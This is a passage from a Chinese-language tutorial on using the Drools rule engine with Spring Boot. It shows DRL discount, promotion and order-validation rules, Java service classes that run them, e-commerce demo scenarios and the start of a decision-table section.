        <span class="hljs-type">KieServices</span> <span class="hljs-variable">kieServices</span> <span class="hljs-operator">=</span> KieServices.Factory.get();
        <span class="hljs-type">KieFileSystem</span> <span class="hljs-variable">kieFileSystem</span> <span class="hljs-operator">=</span> kieServices.newKieFileSystem();

        <span class="hljs-comment">// 加载所有规则文件</span>
        <span class="hljs-type">ResourcePatternResolver</span> <span class="hljs-variable">resourcePatternResolver</span> <span class="hljs-operator">=</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">PathMatchingResourcePatternResolver</span>();
        Resource[] resources = resourcePatternResolver
                .getResources(<span class="hljs-string">"classpath*:"</span> + RULES_PATH + <span class="hljs-string">"**/*.drl"</span>);

        <span class="hljs-keyword">for</span> (Resource resource : resources) {
            kieFileSystem.write(ResourceFactory.newClassPathResource(
                    RULES_PATH + resource.getFilename(), <span class="hljs-string">"UTF-8"</span>));
        }

        <span class="hljs-type">KieBuilder</span> <span class="hljs-variable">kieBuilder</span> <span class="hljs-operator">=</span> kieServices.newKieBuilder(kieFileSystem);
        kieBuilder.buildAll();

        <span class="hljs-type">KieModule</span> <span class="hljs-variable">kieModule</span> <span class="hljs-operator">=</span> kieBuilder.getKieModule();
        <span class="hljs-keyword">return</span> kieServices.newKieContainer(kieModule.getReleaseId());
    }

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> KieSession <span class="hljs-title function_">kieSession</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">return</span> kieContainer().newKieSession();
    }
}
</code></pre>
<h3 data-id="heading-15">五、规则文件编写</h3>
<h4 data-id="heading-16">5.1 折扣规则</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// src/main/resources/rules/discount-rules.drl</span>
<span class="hljs-keyword">package</span> rules

<span class="hljs-keyword">import</span> com.example.drools.model.Order
<span class="hljs-keyword">import</span> com.example.drools.model.Customer
<span class="hljs-keyword">import</span> java.math.BigDecimal

<span class="hljs-comment">// 规则1: VIP客户享受15%折扣</span>
rule <span class="hljs-string">"VIP Customer Discount"</span>
    salience <span class="hljs-number">100</span>  <span class="hljs-comment">// 优先级</span>
    when
        $order: Order(customer.level == <span class="hljs-string">"VIP"</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $order.getTotalAmount()
                .multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.15"</span>));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用VIP折扣: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则2: 金卡客户享受10%折扣</span>
rule <span class="hljs-string">"Gold Customer Discount"</span>
    salience <span class="hljs-number">90</span>
    when
        $order: Order(customer.level == <span class="hljs-string">"GOLD"</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $order.getTotalAmount()
                .multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.10"</span>));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用金卡折扣: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则3: 订单金额超过1000元享受8%折扣</span>
rule <span class="hljs-string">"Large Order Discount"</span>
    salience <span class="hljs-number">80</span>
    when
        $order: Order(totalAmount &gt;= <span class="hljs-number">1000</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $order.getTotalAmount()
                .multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.08"</span>));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用大额订单折扣: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则4: 新客户首单享受5%折扣</span>
rule <span class="hljs-string">"New Customer First Order Discount"</span>
    salience <span class="hljs-number">70</span>
    when
        $order: Order(customer.isNewCustomer == <span class="hljs-literal">true</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $order.getTotalAmount()
                .multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.05"</span>));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用新客户折扣: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则5: 购买商品数量超过10件享受额外折扣</span>
rule <span class="hljs-string">"Bulk Purchase Discount"</span>
    salience <span class="hljs-number">60</span>
    when
        $order: Order(itemCount &gt; <span class="hljs-number">10</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"50"</span>);
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用批量购买折扣: "</span> + discount);
        update($order);
end
</code></pre>
<h4 data-id="heading-17">5.2 促销规则</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// src/main/resources/rules/promotion-rules.drl</span>
<span class="hljs-keyword">package</span> rules

<span class="hljs-keyword">import</span> com.example.drools.model.Order
<span class="hljs-keyword">import</span> com.example.drools.model.OrderItem
<span class="hljs-keyword">import</span> com.example.drools.model.Product
<span class="hljs-keyword">import</span> java.math.BigDecimal
<span class="hljs-keyword">import</span> java.time.LocalDateTime
<span class="hljs-keyword">import</span> java.time.LocalTime

<span class="hljs-comment">// 规则1: 电子产品类别促销 - 买2送1</span>
rule <span class="hljs-string">"Electronics Buy 2 Get 1 Free"</span>
    when
        $order: Order()
        $item: OrderItem(product.category == <span class="hljs-string">"ELECTRONICS"</span>, quantity &gt;= <span class="hljs-number">2</span>) from $order.items
    then
        <span class="hljs-type">int</span> <span class="hljs-variable">freeItems</span> <span class="hljs-operator">=</span> $item.getQuantity() / <span class="hljs-number">2</span>;
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $item.getPrice()
                .multiply(BigDecimal.valueOf(freeItems));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"电子产品买2送1，优惠: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则2: 促销码应用</span>
rule <span class="hljs-string">"Promotion Code - SAVE20"</span>
    when
        $order: Order(promotionCode == <span class="hljs-string">"SAVE20"</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $order.getTotalAmount()
                .multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.20"</span>));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用促销码SAVE20，优惠: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则3: 限时促销 - 每天10-12点额外9折</span>
rule <span class="hljs-string">"Time Limited Promotion"</span>
    when
        $order: Order()
        eval(LocalTime.now().isAfter(LocalTime.of(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>)) &amp;&amp;
             LocalTime.now().isBefore(LocalTime.of(<span class="hljs-number">12</span>, <span class="hljs-number">0</span>)))
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> $order.getTotalAmount()
                .multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.10"</span>));
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"应用限时促销，优惠: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则4: 满减活动 - 满500减50</span>
rule <span class="hljs-string">"Full Reduction 500-50"</span>
    when
        $order: Order(totalAmount &gt;= <span class="hljs-number">500</span>)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"50"</span>);
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"满500减50，优惠: "</span> + discount);
        update($order);
end

<span class="hljs-comment">// 规则5: 特定品类组合优惠</span>
rule <span class="hljs-string">"Category Combo Discount"</span>
    when
        $order: Order()
        exists(OrderItem(product.category == <span class="hljs-string">"ELECTRONICS"</span>) from $order.items)
        exists(OrderItem(product.category == <span class="hljs-string">"BOOKS"</span>) from $order.items)
    then
        <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"30"</span>);
        $order.applyDiscount(discount);
        System.out.println(<span class="hljs-string">"电子产品+图书组合优惠: "</span> + discount);
        update($order);
end
</code></pre>
<h4 data-id="heading-18">5.3 验证规则</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// src/main/resources/rules/validation-rules.drl</span>
<span class="hljs-keyword">package</span> rules

<span class="hljs-keyword">import</span> com.example.drools.model.Order
<span class="hljs-keyword">import</span> com.example.drools.model.OrderItem
<span class="hljs-keyword">import</span> com.example.drools.model.Product

global java.util.List validationErrors

<span class="hljs-comment">// 规则1: 库存验证</span>
rule <span class="hljs-string">"Check Product Stock"</span>
    when
        $order: Order()
        $item: OrderItem(product.stockQuantity &lt; quantity) from $order.items
    then
        validationErrors.add(<span class="hljs-string">"产品 "</span> + $item.getProduct().getName() +
                           <span class="hljs-string">" 库存不足，库存: "</span> + $item.getProduct().getStockQuantity() +
                           <span class="hljs-string">"，需求: "</span> + $item.getQuantity());
        System.out.println(<span class="hljs-string">"库存验证失败: "</span> + $item.getProduct().getName());
end

<span class="hljs-comment">// 规则2: 订单金额验证</span>
rule <span class="hljs-string">"Minimum Order Amount"</span>
    when
        $order: Order(totalAmount &lt; <span class="hljs-number">10</span>)
    then
        validationErrors.add(<span class="hljs-string">"订单金额不能少于10元"</span>);
        System.out.println(<span class="hljs-string">"订单金额验证失败"</span>);
end

<span class="hljs-comment">// 规则3: 订单项数量验证</span>
rule <span class="hljs-string">"Maximum Item Quantity"</span>
    when
        $order: Order()
        $item: OrderItem(quantity &gt; <span class="hljs-number">100</span>) from $order.items
    then
        validationErrors.add(<span class="hljs-string">"单个商品购买数量不能超过100件"</span>);
        System.out.println(<span class="hljs-string">"商品数量验证失败"</span>);
end

<span class="hljs-comment">// 规则4: VIP客户特殊权限</span>
rule <span class="hljs-string">"VIP Special Product Access"</span>
    when
        $order: Order(customer.level != <span class="hljs-string">"VIP"</span>)
        $item: OrderItem(product.name matches <span class="hljs-string">".*VIP专享.*"</span>) from $order.items
    then
        validationErrors.add(<span class="hljs-string">"VIP专享商品仅限VIP客户购买"</span>);
        System.out.println(<span class="hljs-string">"VIP权限验证失败"</span>);
end
</code></pre>
<h3 data-id="heading-19">六、规则服务实现</h3>
<h4 data-id="heading-20">6.1 规则引擎服务</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.service;

<span class="hljs-keyword">import</span> com.example.drools.model.Order;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieContainer;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieSession;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuleService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> KieContainer kieContainer;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RuleService</span><span class="hljs-params">(KieContainer kieContainer)</span> {
        <span class="hljs-built_in">this</span>.kieContainer = kieContainer;
    }

    <span class="hljs-comment">/**
     * 执行折扣规则
     */</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">applyDiscountRules</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession();

        <span class="hljs-keyword">try</span> {
            log.info(<span class="hljs-string">"开始执行折扣规则，订单ID: {}"</span>, order.getOrderId());

            <span class="hljs-comment">// 插入事实对象</span>
            kieSession.insert(order);

            <span class="hljs-comment">// 触发所有规则</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">firedRules</span> <span class="hljs-operator">=</span> kieSession.fireAllRules();

            log.info(<span class="hljs-string">"执行了 {} 条规则"</span>, firedRules);
            log.info(<span class="hljs-string">"原始金额: {}, 折扣金额: {}, 最终金额: {}"</span>,
                    order.getTotalAmount(),
                    order.getDiscountAmount(),
                    order.getFinalAmount());

            <span class="hljs-keyword">return</span> order;
        } <span class="hljs-keyword">finally</span> {
            kieSession.dispose();
        }
    }

    <span class="hljs-comment">/**
     * 验证订单
     */</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">validateOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession();
        List&lt;String&gt; validationErrors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

        <span class="hljs-keyword">try</span> {
            log.info(<span class="hljs-string">"开始验证订单，订单ID: {}"</span>, order.getOrderId());

            <span class="hljs-comment">// 设置全局变量</span>
            kieSession.setGlobal(<span class="hljs-string">"validationErrors"</span>, validationErrors);

            <span class="hljs-comment">// 插入事实对象</span>
            kieSession.insert(order);
            order.getItems().forEach(kieSession::insert);

            <span class="hljs-comment">// 触发所有规则</span>
            kieSession.fireAllRules();

            <span class="hljs-keyword">if</span> (validationErrors.isEmpty()) {
                log.info(<span class="hljs-string">"订单验证通过"</span>);
            } <span class="hljs-keyword">else</span> {
                log.warn(<span class="hljs-string">"订单验证失败: {}"</span>, validationErrors);
            }

            <span class="hljs-keyword">return</span> validationErrors;
        } <span class="hljs-keyword">finally</span> {
            kieSession.dispose();
        }
    }

    <span class="hljs-comment">/**
     * 执行指定规则
     */</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">applySpecificRule</span><span class="hljs-params">(Order order, String ruleName)</span> {
        <span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession();

        <span class="hljs-keyword">try</span> {
            log.info(<span class="hljs-string">"执行指定规则: {}"</span>, ruleName);

            kieSession.insert(order);

            <span class="hljs-comment">// 执行指定的规则</span>
            kieSession.getAgenda().getAgendaGroup(ruleName).setFocus();
            kieSession.fireAllRules();

            <span class="hljs-keyword">return</span> order;
        } <span class="hljs-keyword">finally</span> {
            kieSession.dispose();
        }
    }

    <span class="hljs-comment">/**
     * 批量处理订单
     */</span>
    <span class="hljs-keyword">public</span> List&lt;Order&gt; <span class="hljs-title function_">batchProcessOrders</span><span class="hljs-params">(List&lt;Order&gt; orders)</span> {
        <span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession();

        <span class="hljs-keyword">try</span> {
            log.info(<span class="hljs-string">"批量处理 {} 个订单"</span>, orders.size());

            <span class="hljs-comment">// 插入所有订单</span>
            orders.forEach(kieSession::insert);

            <span class="hljs-comment">// 触发所有规则</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">firedRules</span> <span class="hljs-operator">=</span> kieSession.fireAllRules();
            log.info(<span class="hljs-string">"总共执行了 {} 条规则"</span>, firedRules);

            <span class="hljs-keyword">return</span> orders;
        } <span class="hljs-keyword">finally</span> {
            kieSession.dispose();
        }
    }
}
</code></pre>
<h4 data-id="heading-21">6.2 订单处理服务</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.service;

<span class="hljs-keyword">import</span> com.example.drools.model.*;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.math.BigDecimal;
<span class="hljs-keyword">import</span> java.time.LocalDateTime;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RuleService ruleService;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderService</span><span class="hljs-params">(RuleService ruleService)</span> {
        <span class="hljs-built_in">this</span>.ruleService = ruleService;
    }

    <span class="hljs-comment">/**
     * 创建订单并应用规则
     */</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Customer customer, List&lt;OrderItem&gt; items, String promotionCode)</span> {
        <span class="hljs-comment">// 创建订单</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setOrderId(System.currentTimeMillis());
        order.setCustomer(customer);
        order.setItems(items);
        order.setOrderTime(LocalDateTime.now());
        order.setPromotionCode(promotionCode);
        order.setStatus(<span class="hljs-string">"CREATED"</span>);

        <span class="hljs-comment">// 计算小计</span>
        items.forEach(OrderItem::calculateSubtotal);

        <span class="hljs-comment">// 计算总金额</span>
        order.calculateTotalAmount();
        order.setFinalAmount(order.getTotalAmount());

        log.info(<span class="hljs-string">"创建订单: {}, 客户: {}, 原始金额: {}"</span>,
                order.getOrderId(),
                customer.getName(),
                order.getTotalAmount());

        <span class="hljs-comment">// 验证订单</span>
        List&lt;String&gt; errors = ruleService.validateOrder(order);
        <span class="hljs-keyword">if</span> (!errors.isEmpty()) {
            order.setStatus(<span class="hljs-string">"VALIDATION_FAILED"</span>);
            log.error(<span class="hljs-string">"订单验证失败: {}"</span>, errors);
            <span class="hljs-keyword">return</span> order;
        }

        <span class="hljs-comment">// 应用折扣规则</span>
        order = ruleService.applyDiscountRules(order);
        order.setStatus(<span class="hljs-string">"CONFIRMED"</span>);

        log.info(<span class="hljs-string">"订单处理完成: {}, 最终金额: {}, 节省: {}"</span>,
                order.getOrderId(),
                order.getFinalAmount(),
                order.getDiscountAmount());

        <span class="hljs-keyword">return</span> order;
    }

    <span class="hljs-comment">/**
     * 计算订单优惠预览
     */</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">previewDiscount</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-comment">// 创建订单副本用于预览</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">previewOrder</span> <span class="hljs-operator">=</span> cloneOrder(order);
        <span class="hljs-keyword">return</span> ruleService.applyDiscountRules(previewOrder);
    }

    <span class="hljs-keyword">private</span> Order <span class="hljs-title function_">cloneOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">clone</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        clone.setOrderId(order.getOrderId());
        clone.setCustomer(order.getCustomer());
        clone.setItems(order.getItems());
        clone.setTotalAmount(order.getTotalAmount());
        clone.setFinalAmount(order.getTotalAmount());
        clone.setPromotionCode(order.getPromotionCode());
        <span class="hljs-keyword">return</span> clone;
    }
}
</code></pre>
<h3 data-id="heading-22">七、实际应用场景</h3>
<h4 data-id="heading-23">7.1 电商促销系统</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.scenario;

<span class="hljs-keyword">import</span> com.example.drools.model.*;
<span class="hljs-keyword">import</span> com.example.drools.service.OrderService;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> java.math.BigDecimal;
<span class="hljs-keyword">import</span> java.time.LocalDate;
<span class="hljs-keyword">import</span> java.util.Arrays;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EcommerceScenario</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderService orderService;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EcommerceScenario</span><span class="hljs-params">(OrderService orderService)</span> {
        <span class="hljs-built_in">this</span>.orderService = orderService;
    }

    <span class="hljs-comment">/**
     * 场景1: VIP客户购买电子产品
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">vipCustomerPurchase</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 创建VIP客户</span>
        <span class="hljs-type">Customer</span> <span class="hljs-variable">vipCustomer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Customer</span>(
                <span class="hljs-number">1L</span>,
                <span class="hljs-string">"张三"</span>,
                <span class="hljs-string">"VIP"</span>,
                <span class="hljs-number">5000</span>,
                LocalDate.of(<span class="hljs-number">2020</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>),
                <span class="hljs-literal">false</span>
        );

        <span class="hljs-comment">// 创建商品</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">laptop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">101L</span>,
                <span class="hljs-string">"笔记本电脑"</span>,
                <span class="hljs-string">"ELECTRONICS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"5999"</span>),
                <span class="hljs-literal">true</span>,
                <span class="hljs-number">50</span>
        );

        <span class="hljs-type">Product</span> <span class="hljs-variable">mouse</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">102L</span>,
                <span class="hljs-string">"无线鼠标"</span>,
                <span class="hljs-string">"ELECTRONICS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"199"</span>),
                <span class="hljs-literal">true</span>,
                <span class="hljs-number">100</span>
        );

        <span class="hljs-comment">// 创建订单项</span>
        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(laptop, <span class="hljs-number">1</span>, laptop.getPrice(), BigDecimal.ZERO);
        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(mouse, <span class="hljs-number">2</span>, mouse.getPrice(), BigDecimal.ZERO);

        List&lt;OrderItem&gt; items = Arrays.asList(item1, item2);

        <span class="hljs-comment">// 处理订单</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.createOrder(vipCustomer, items, <span class="hljs-literal">null</span>);

        printOrderSummary(order);
    }

    <span class="hljs-comment">/**
     * 场景2: 新客户首单
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">newCustomerFirstOrder</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Customer</span> <span class="hljs-variable">newCustomer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Customer</span>(
                <span class="hljs-number">2L</span>,
                <span class="hljs-string">"李四"</span>,
                <span class="hljs-string">"NORMAL"</span>,
                <span class="hljs-number">0</span>,
                LocalDate.now(),
                <span class="hljs-literal">true</span>
        );

        <span class="hljs-type">Product</span> <span class="hljs-variable">book</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">201L</span>,
                <span class="hljs-string">"Java编程思想"</span>,
                <span class="hljs-string">"BOOKS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"89"</span>),
                <span class="hljs-literal">false</span>,
                <span class="hljs-number">200</span>
        );

        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(book, <span class="hljs-number">3</span>, book.getPrice(), BigDecimal.ZERO);

        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.createOrder(newCustomer, Arrays.asList(item), <span class="hljs-literal">null</span>);

        printOrderSummary(order);
    }

    <span class="hljs-comment">/**
     * 场景3: 促销码+大额订单
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">promotionCodePurchase</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Customer</span> <span class="hljs-variable">goldCustomer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Customer</span>(
                <span class="hljs-number">3L</span>,
                <span class="hljs-string">"王五"</span>,
                <span class="hljs-string">"GOLD"</span>,
                <span class="hljs-number">2000</span>,
                LocalDate.of(<span class="hljs-number">2022</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>),
                <span class="hljs-literal">false</span>
        );

        <span class="hljs-type">Product</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">301L</span>,
                <span class="hljs-string">"智能手机"</span>,
                <span class="hljs-string">"ELECTRONICS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"3999"</span>),
                <span class="hljs-literal">true</span>,
                <span class="hljs-number">30</span>
        );

        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(phone, <span class="hljs-number">1</span>, phone.getPrice(), BigDecimal.ZERO);

        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.createOrder(
                goldCustomer,
                Arrays.asList(item),
                <span class="hljs-string">"SAVE20"</span>
        );

        printOrderSummary(order);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printOrderSummary</span><span class="hljs-params">(Order order)</span> {
        System.out.println(<span class="hljs-string">"\n========== 订单摘要 =========="</span>);
        System.out.println(<span class="hljs-string">"订单ID: "</span> + order.getOrderId());
        System.out.println(<span class="hljs-string">"客户: "</span> + order.getCustomer().getName() +
                         <span class="hljs-string">" ("</span> + order.getCustomer().getLevel() + <span class="hljs-string">")"</span>);
        System.out.println(<span class="hljs-string">"商品数量: "</span> + order.getItemCount());
        System.out.println(<span class="hljs-string">"原始金额: ¥"</span> + order.getTotalAmount());
        System.out.println(<span class="hljs-string">"优惠金额: ¥"</span> + order.getDiscountAmount());
        System.out.println(<span class="hljs-string">"最终金额: ¥"</span> + order.getFinalAmount());
        System.out.println(<span class="hljs-string">"状态: "</span> + order.getStatus());
        System.out.println(<span class="hljs-string">"=============================\n"</span>);
    }
}
</code></pre>
<h4 data-id="heading-24">7.2 规则执行流程</h4>
<pre><code class="hljs language-lua" lang="lua">订单处理流程:

+<span class="hljs-comment">------------------+</span>
|   创建订单对象    |
+<span class="hljs-comment">--------+---------+</span>
         |
         v
+<span class="hljs-comment">--------+---------+</span>
|   计算商品小计    |
+<span class="hljs-comment">--------+---------+</span>
         |
         v
+<span class="hljs-comment">--------+---------+</span>
|   计算订单总额    |
+<span class="hljs-comment">--------+---------+</span>
         |
         v
+<span class="hljs-comment">--------+---------+</span>
|   订单验证规则    |
|   - 库存检查     |
|   - 金额检查     |
|   - 权限检查     |
+<span class="hljs-comment">--------+---------+</span>
         |
    +<span class="hljs-comment">----+----+</span>
    |         |
   YES       NO
    |         |
    v         v
+<span class="hljs-comment">---+----+ +--+------------+</span>
|折扣规则 | | 返回验证错误  |
|执行    | +<span class="hljs-comment">--------------+</span>
+<span class="hljs-comment">---+----+</span>
    |
    v
+<span class="hljs-comment">---+------------+</span>
| 按优先级执行:   |
| <span class="hljs-number">1.</span> VIP折扣     |
| <span class="hljs-number">2.</span> 会员折扣     |
| <span class="hljs-number">3.</span> 大额折扣     |
| <span class="hljs-number">4.</span> 促销折扣     |
+<span class="hljs-comment">---+------------+</span>
    |
    v
+<span class="hljs-comment">---+------------+</span>
| 计算最终金额    |
+<span class="hljs-comment">---+------------+</span>
    |
    v
+<span class="hljs-comment">---+------------+</span>
| 返回订单结果    |
+<span class="hljs-comment">----------------+</span>
</code></pre>
<h3 data-id="heading-25">八、Decision Table决策表</h3>
<h4 data-id="heading-26">8.1 Excel决策表</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 决策表结构 (在Excel中)</span>
<span class="hljs-comment">/*
RuleTable DiscountDecisionTable

CONDITION                    CONDITION           CONDITION       ACTION
客户等级                      订单金额            商品数量         折扣率
customer.level              totalAmount         itemCount       discountRate

VIP                         &gt;1000               &gt;5              0.20
VIP                         &gt;500                &gt;0              0.15
GOLD                        &gt;1000               &gt;5              0.15
GOLD                        &gt;500                &gt;0              0.10
SILVER                      &gt;1000               &gt;10             0.10
SILVER                      &gt;500                &gt;0              0.08
NORMAL                      &gt;2000               &gt;20             0.08
NORMAL                      &gt;1000               &gt;10             0.05
*/</span>
</code></pre>
<h4 data-id="heading-27">8.2 加载Decision Table</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.config;
